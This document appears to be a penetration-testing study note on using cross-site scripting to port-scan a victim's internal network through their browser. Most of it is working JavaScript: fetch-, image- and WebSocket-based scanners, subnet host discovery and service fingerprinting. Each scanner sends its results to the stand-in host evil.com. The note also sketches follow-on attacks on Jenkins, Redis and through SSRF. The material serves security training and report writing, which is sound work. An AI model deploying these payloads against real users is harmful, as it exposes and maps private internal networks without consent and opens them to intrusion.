---
tags: [vapt, xss, advanced]
difficulty: advanced
module: "07 - XSS"
topic: "07.20 XSS to Internal Port Scanning"
---

# 07.20 — XSS to Port Scanning (Internal Network via Browser)

## Concept: Using the Victim's Browser as a Scanner

When a victim's browser executes XSS, it runs from inside their network. The browser can make requests to internal IP addresses that the attacker can't reach directly. This allows port scanning of the victim's internal network — uncovering admin panels, databases, routers, and internal services.

```
ATTACKER CAN'T REACH:                  VICTIM'S BROWSER CAN:
  192.168.1.1  (router)                   192.168.1.1:80   → HTTP admin panel
  192.168.1.100 (internal server)          192.168.1.100:22  → SSH
  10.0.0.5    (database)                  10.0.0.5:3306    → MySQL
  
ATTACK FLOW:
  XSS fires in victim's browser
       ↓
  JS makes requests to internal IP:port
       ↓
  Measure response time:
    Fast response (<100ms) = port OPEN (something responded)
    Timeout (>3000ms)      = port CLOSED (connection refused or filtered)
       ↓
  Report results to attacker's server
```

---

## Basic Port Scanner via XSS

```javascript
// SIMPLE FETCH-BASED PORT SCANNER:
// Limitation: can't read response body (CORS), but can detect OPEN ports by timing!

async function scanPort(host, port, timeout=2000) {
  return new Promise((resolve) => {
    var start = Date.now();
    var controller = new AbortController();
    var timer = setTimeout(() => {
      controller.abort();
      resolve({host, port, open: false, time: timeout});
    }, timeout);
    
    fetch('http://' + host + ':' + port, {
      mode: 'no-cors',
      signal: controller.signal
    }).then(() => {
      clearTimeout(timer);
      var elapsed = Date.now() - start;
      resolve({host, port, open: true, time: elapsed});
    }).catch(err => {
      clearTimeout(timer);
      var elapsed = Date.now() - start;
      // Connection refused = fast → port exists but closed differently than filtered
      var open = elapsed < timeout;  // rough heuristic
      resolve({host, port, open, time: elapsed, err: err.name});
    });
  });
}

// SCAN A RANGE OF PORTS ON THE INTERNAL GATEWAY:
async function scanAll() {
  var target = '192.168.1.1';
  var ports = [80, 443, 8080, 8443, 22, 23, 21, 3306, 5432, 6379, 27017, 9200];
  var results = [];
  
  for (var p of ports) {
    var r = await scanPort(target, p);
    results.push(r);
    // Send each result immediately:
    fetch('https://evil.com/scan?h='+target+'&p='+p+'&open='+r.open+'&t='+r.time, {mode:'no-cors'});
  }
}

scanAll();
```

---

## Image-Based Port Scanner (More Compatible)

```javascript
// USING IMAGE LOADING — works in more environments than fetch():

function scanPortImage(host, port, timeout=2000) {
  return new Promise((resolve) => {
    var img = new Image();
    var start = Date.now();
    var done = false;
    
    var timer = setTimeout(() => {
      if (!done) {
        done = true;
        img.src = '';  // cancel
        resolve({host, port, open: false, time: timeout, method: 'timeout'});
      }
    }, timeout);
    
    img.onload = function() {
      if (!done) {
        done = true;
        clearTimeout(timer);
        // Port is open AND serving something image-like
        resolve({host, port, open: true, time: Date.now()-start, method: 'load'});
      }
    };
    
    img.onerror = function() {
      if (!done) {
        done = true;
        clearTimeout(timer);
        // Fast error = port open but not HTTP/image
        // Slow error = timeout-based → port filtered
        var elapsed = Date.now() - start;
        resolve({host, port, open: elapsed < timeout*0.8, time: elapsed, method: 'error'});
      }
    };
    
    img.src = 'http://' + host + ':' + port + '/favicon.ico?' + Math.random();
  });
}
```

---

## Scanning Internal IP Ranges

```javascript
// DISCOVER LIVE HOSTS IN COMMON SUBNETS:

async function discoverHosts() {
  var subnets = ['192.168.0.', '192.168.1.', '10.0.0.', '172.16.0.'];
  var results = [];
  
  for (var subnet of subnets) {
    // Scan x.x.x.1 (gateway) and x.x.x.100-110 (common server range)
    var hosts = [1, 100, 101, 102, 103, 110, 200, 254];
    
    for (var host of hosts) {
      var ip = subnet + host;
      var r = await scanPort(ip, 80, 1500);
      if (r.open) {
        results.push(ip);
        fetch('https://evil.com/host?ip='+ip, {mode:'no-cors'});
      }
    }
  }
  return results;
}

// PHASE 2: DEEP SCAN LIVE HOSTS:
async function deepScan(liveHosts) {
  var ports = [21,22,23,25,80,443,445,3306,5432,6379,8080,8443,27017,9200,5601,3000,4444,4848];
  
  for (var host of liveHosts) {
    for (var port of ports) {
      var r = await scanPort(host, port, 1500);
      if (r.open) {
        fetch('https://evil.com/port?host='+host+'&port='+port+'&t='+r.time, {mode:'no-cors'});
      }
    }
  }
}
```

---

## WebSocket-Based Scanning

```javascript
// WEBSOCKET ATTEMPTS — FASTER THAN FETCH FOR SOME HOSTS:
function wsScan(host, port, timeout=1500) {
  return new Promise(resolve => {
    var ws;
    var start = Date.now();
    var done = false;
    
    var timer = setTimeout(() => {
      if (!done) { done = true; ws.close(); resolve({port, open: false, time: timeout}); }
    }, timeout);
    
    try {
      ws = new WebSocket('ws://' + host + ':' + port);
      ws.onerror = () => {
        if (!done) {
          done = true; clearTimeout(timer);
          var t = Date.now()-start;
          resolve({port, open: t < timeout*0.7, time: t});
        }
      };
      ws.onopen = () => {
        if (!done) {
          done = true; clearTimeout(timer);
          ws.close();
          resolve({port, open: true, time: Date.now()-start});
        }
      };
    } catch(e) {
      if (!done) { done = true; clearTimeout(timer); resolve({port, open: false, error: e.message}); }
    }
  });
}
```

---

## Fingerprinting Open Services

```javascript
// DETECT WHAT'S RUNNING ON OPEN PORTS:
// (Can only observe timing/response length, not content, due to CORS)

// CHECK IF IT'S A WEB SERVER WITH A SPECIFIC PATH:
async function probeService(host, port) {
  var paths = ['/manager/html', '/admin', '/.git/HEAD', '/api/v1/status',
               '/actuator/health', '/solr/admin', '/jenkins', '/kibana'];
  
  for (var path of paths) {
    var start = Date.now();
    try {
      var r = await fetch('http://'+host+':'+port+path, {mode:'no-cors'});
      // If we get here: server responded (not necessarily with 200, but something)
      fetch('https://evil.com/probe?host='+host+'&port='+port+'&path='+path+'&t='+(Date.now()-start), {mode:'no-cors'});
    } catch(e) {
      // Error = not found or blocked — less interesting
    }
  }
}

// DETECT DATABASE SERVICES:
// Port 3306 = MySQL, 5432 = PostgreSQL, 27017 = MongoDB, 6379 = Redis, 9200 = Elasticsearch
// If open → try HTTP requests:
// Redis: http://host:6379/ → usually returns -ERR (HTTP not supported but connection made!)
```

---

## What to Do with Scan Results

```
FOUND PORT 8080 ON 192.168.1.50?
  → Access it through the victim's browser (XSS-based browsing):
    fetch('http://192.168.1.50:8080/', {mode:'no-cors'})
  → But you can't read the response...
  
  → Use fetch with same-origin (won't work cross-origin)
  → However: can make forms submit to internal services!

FOUND JENKINS ON 192.168.1.50:8080?
  → Try to create/trigger jobs via Groovy script console
  → If admin panel is accessible from victim's browser:
    Create exploit: fetch('/jenkins/script', {method:'POST', ...})

FOUND REDIS ON 10.0.0.5:6379?
  → Redis has no auth by default
  → Can't speak raw Redis via browser, but can probe for SSRF elsewhere!

REPORT IMPACT:
  "Using the XSS vulnerability, the victim's browser was weaponized to
   scan the internal network, identifying:
   - 192.168.1.1:80 — Router admin panel (Netgear)
   - 192.168.1.100:8080 — Jenkins CI/CD server (unauthenticated)
   - 10.0.0.5:6379 — Redis server (unauthenticated)
   These internal services are not accessible from the internet but are
   reachable from within the corporate network."
```

---

## Combining with SSRF

```
XSS + SSRF = COMPLETE INTERNAL NETWORK ACCESS

  1. XSS: scan for internal services via victim's browser
  2. Discover: internal API at http://10.0.0.10/api
  3. Use SSRF in another endpoint: make the SERVER fetch that internal API
  4. SSRF: fetch('http://10.0.0.10/api/secrets') → read internal data!
  
  The XSS gives you the map
  The SSRF lets you read from the map!
```

---

## Related Notes
- [[04 - DOM-Based XSS]] — XSS execution context
- [[Module 12 - SSRF]] — SSRF to internal network access
- [[17 - XSS to Account Takeover]] — combining with ATO
- [[05 - Blind XSS]] — XSS against admin users (most network access)
